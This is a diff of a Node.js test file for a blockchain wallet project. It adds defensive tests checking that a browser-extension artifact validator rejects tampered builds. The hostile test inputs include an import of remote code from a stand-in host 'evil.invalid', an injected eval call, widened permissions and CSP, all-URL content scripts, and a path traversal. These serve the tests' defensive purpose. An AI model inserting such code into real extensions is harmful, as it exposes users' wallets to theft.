@@ -1,9 +1,10 @@
 import assert from "node:assert/strict";
 import { execFileSync, spawn, spawnSync } from "node:child_process";
+import { createHash } from "node:crypto";
 import { request as httpRequest } from "node:http";
 import { createServer as createNetServer } from "node:net";
 import { copyFileSync, existsSync, linkSync, lstatSync, mkdirSync, mkdtempSync, readFileSync,
-  readlinkSync, readdirSync, renameSync, rmSync, symlinkSync, truncateSync,
+  readlinkSync, readdirSync, realpathSync, renameSync, rmSync, symlinkSync, truncateSync,
   unlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -29,6 +30,7 @@ import { createTestnetPartitionDrillPlan } from "../blockchain/testnet-partition
 import { createWalletFile } from "../blockchain/wallet-files.mjs";
 import { createProductionStartupGuard,
   createWalletBridgeProductionGuard } from "../blockchain/production-startup.mjs";
+import { validateProductionWalletExtensionArtifact } from "../blockchain/production-wallet-extension.mjs";
 import {
   advanceProductionHead, exportProductionHeadAnchor, loadProductionHeadStore,
   repairProductionHeadCopies, verifyProductionStartupFromHead,
@@ -150,6 +152,16 @@ function rawHttpStatus(port, path, { headers = {}, host = "127.0.0.1", method = 
     });
     request.once("error", reject); request.end();
   });
+}
+
+function mutateArtifactText(artifact, path, mutation) {
+  const changed = structuredClone(artifact);
+  const entry = changed.entries.find((candidate) => candidate.path === `wallet-ui/${path}`);
+  const body = mutation(Buffer.from(entry.content, "base64").toString("utf8"));
+  entry.content = Buffer.from(body).toString("base64"); entry.size = Buffer.byteLength(body);
+  entry.sha3_256 = createHash("sha3-256").update("NIR/ARTIFACT_FILE/v1\0")
+    .update(Buffer.from(body)).digest("hex");
+  return changed;
 }
 
 async function waitForOutput(child, pattern) {
@@ -756,6 +768,40 @@ test("production wallet bridge and UI verify anchored generations before bind on
     const toolArtifact = createReleaseArtifact(values.root, artifactPaths("node", paths), {
       kind: "node", sourceManifest: manifest,
     });
+    assert.equal(validateProductionWalletExtensionArtifact(walletArtifact).files, walletFiles.length);
+    const extraArtifact = structuredClone(walletArtifact);
+    extraArtifact.entries.push({ content: Buffer.from("extra").toString("base64"),
+      executable: false, path: "wallet-ui/background.js", sha3_256: "0".repeat(64), size: 5 });
+    assert.throws(() => validateProductionWalletExtensionArtifact(extraArtifact), /extra/);
+    const permissionArtifact = mutateArtifactText(walletArtifact, "manifest.json", (text) => {
+      const value = JSON.parse(text); value.permissions = ["tabs"]; return JSON.stringify(value);
+    });
+    assert.throws(() => validateProductionWalletExtensionArtifact(permissionArtifact), /permissions/);
+    const backgroundArtifact = mutateArtifactText(walletArtifact, "manifest.json", (text) => {
+      const value = JSON.parse(text); value.background = { service_worker: "sw.js" };
+      return JSON.stringify(value);
+    });
+    assert.throws(() => validateProductionWalletExtensionArtifact(backgroundArtifact), /schema/);
+    const contentScriptArtifact = mutateArtifactText(walletArtifact, "manifest.json", (text) => {
+      const value = JSON.parse(text); value.content_scripts = [{ js: ["app.js"], matches: ["<all_urls>"] }];
+      return JSON.stringify(value);
+    });
+    assert.throws(() => validateProductionWalletExtensionArtifact(contentScriptArtifact), /schema/);
+    const remoteCodeArtifact = mutateArtifactText(walletArtifact, "app.js",
+      (text) => `import "https://evil.invalid/code.js";\n${text}`);
+    assert.throws(() => validateProductionWalletExtensionArtifact(remoteCodeArtifact), /remote/);
+    const evalArtifact = mutateArtifactText(walletArtifact, "app.js",
+      (text) => `${text}\neval("globalThis.compromised=true");\n`);
+    assert.throws(() => validateProductionWalletExtensionArtifact(evalArtifact), /dynamic evaluation/);
+    const cspArtifact = mutateArtifactText(walletArtifact, "manifest.json", (text) => {
+      const value = JSON.parse(text);
+      value.content_security_policy.extension_pages += " https://evil.invalid";
+      return JSON.stringify(value);
+    });
+    assert.throws(() => validateProductionWalletExtensionArtifact(cspArtifact), /permissions or CSP/);
+    const traversalArtifact = mutateArtifactText(walletArtifact, "index.html",
+      (text) => text.replace("app.js?v=31", "../app.js"));
+    assert.throws(() => validateProductionWalletExtensionArtifact(traversalArtifact), /unsafe|unverified/);
     const packageValue = createProductionReleasePackage(walletArtifact, { now: NOW,
       productionReport: evidence.productionReport, productionTarget: evidence.productionTarget,
       signedRelease, trustedAddress: values.signer.address });
@@ -785,6 +831,63 @@ test("production wallet bridge and UI verify anchored generations before bind on
     const vault = join(values.root, "wallet.nir");
     createWalletFile({ path: vault, password: "production-wallet-password" });
     const toolGeneration = join(values.root, readlinkSync(toolInstallation));
+    const extensionCli = join(toolGeneration, "blockchain/production-wallet-extension-cli.mjs");
+    const extensionTarget = join(values.root, "browser-extension");
+    const extensionTrustArguments = [installation, head, signedPath, values.signer.address,
+      anchorPath, toolInstallation, toolHead, toolAnchorPath];
+    const extensionInstall = spawnSync(process.execPath,
+      [extensionCli, "install", ...extensionTrustArguments, extensionTarget], { encoding: "utf8" });
+    assert.equal(extensionInstall.status, 0, extensionInstall.stderr);
+    const launchRecord = JSON.parse(extensionInstall.stdout);
+    assert.equal(launchRecord.packageHash, packageValue.packageHash);
+    assert.equal(launchRecord.extensionPath, realpathSync(extensionTarget));
+    const extensionVerify = spawnSync(process.execPath,
+      [extensionCli, "verify-launch", ...extensionTrustArguments, extensionTarget],
+      { encoding: "utf8" });
+    assert.equal(extensionVerify.status, 0, extensionVerify.stderr);
+    const sourceExtensionCli = new URL(
+      "../blockchain/production-wallet-extension-cli.mjs", import.meta.url,
+    ).pathname;
+    const externalExtension = spawnSync(process.execPath,
+      [sourceExtensionCli, "verify-launch", ...extensionTrustArguments, extensionTarget],
+      { encoding: "utf8" });
+    assert.equal(externalExtension.status, 1);
+
+    const occupiedExtensionTarget = join(values.root, "occupied-extension");
+    mkdirSync(occupiedExtensionTarget); writeFileSync(join(occupiedExtensionTarget, "foreign"), "keep\n");
+    const occupiedInstall = spawnSync(process.execPath,
+      [extensionCli, "install", ...extensionTrustArguments, occupiedExtensionTarget],
+      { encoding: "utf8" });
+    assert.equal(occupiedInstall.status, 1);
+    assert.equal(readFileSync(join(occupiedExtensionTarget, "foreign"), "utf8"), "keep\n");
+    const rollbackExtensionTarget = join(values.root, "rollback-extension");
+    const rollbackUpdate = spawnSync(process.execPath, [extensionCli, "update",
+      ...extensionTrustArguments, extensionTarget, signedPath, packageValue.packageHash,
+      rollbackExtensionTarget], { encoding: "utf8" });
+    assert.equal(rollbackUpdate.status, 1);
+    assert.equal(existsSync(rollbackExtensionTarget), false);
+
+    const extensionGeneration = launchRecord.extensionPath;
+    writeFileSync(join(extensionGeneration, "unexpected.js"), "throw new Error('extra');\n");
+    const extraVerify = spawnSync(process.execPath,
+      [extensionCli, "verify-launch", ...extensionTrustArguments, extensionTarget],
+      { encoding: "utf8" });
+    assert.equal(extraVerify.status, 1); unlinkSync(join(extensionGeneration, "unexpected.js"));
+    const installedApp = join(extensionGeneration, "app.js");
+    const installedAppBytes = readFileSync(installedApp); unlinkSync(installedApp);
+    symlinkSync(join(values.root, "wallet-ui", "app.js"), installedApp);
+    const symlinkVerify = spawnSync(process.execPath,
+      [extensionCli, "verify-launch", ...extensionTrustArguments, extensionTarget],
+      { encoding: "utf8" });
+    assert.equal(symlinkVerify.status, 1); unlinkSync(installedApp);
+    writeFileSync(installedApp, installedAppBytes, { mode: 0o644 });
+    writeFileSync(installedApp, "throw new Error('tampered extension');\n");
+    const tamperedExtension = spawnSync(process.execPath,
+      [extensionCli, "verify-launch", ...extensionTrustArguments, extensionTarget],
+      { encoding: "utf8" });
+    assert.equal(tamperedExtension.status, 1);
+    writeFileSync(installedApp, installedAppBytes, { mode: 0o644 });
+
     const cli = join(toolGeneration, "blockchain/wallet-bridge-cli.mjs");
     const origin = "http://127.0.0.1:8765";
     for (let restart = 0; restart < 2; restart += 1) {
@@ -929,6 +1032,10 @@ test("production wallet bridge and UI verify anchored generations before bind on
     const oldToolAnchorPath = join(values.root, "old-bridge-tool-anchor.json");
     writeFileSync(oldToolAnchorPath,
       `${canonicalJson(exportProductionHeadAnchor(oldToolHead))}\n`);
+    const staleExtension = spawnSync(process.execPath, [extensionCli, "verify-launch",
+      installation, head, signedPath, values.signer.address, anchorPath, toolInstallation,
+      toolHead, oldToolAnchorPath, extensionTarget], { encoding: "utf8" });
+    assert.equal(staleExtension.status, 1);
     const rollbackPort = await unusedPort();
     const rollbackBlocked = spawnSync(process.execPath, [uiCli, installation, head, signedPath,
       values.signer.address, anchorPath, toolInstallation, toolHead, oldToolAnchorPath,
